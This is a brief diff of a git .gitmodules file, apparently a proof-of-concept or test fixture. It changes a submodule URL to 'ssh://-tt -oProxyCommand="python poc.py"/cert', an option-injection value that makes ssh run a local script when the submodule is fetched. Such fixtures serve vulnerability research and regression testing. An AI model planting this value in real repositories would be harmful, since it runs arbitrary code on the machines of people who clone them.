@@ -1,3 +1,3 @@
 [submodule "world"]
 	path = world
-	url = ssh://-tt -oProxyCommand=python poc.py/cert
+	url = ssh://-tt -oProxyCommand="python poc.py"/cert
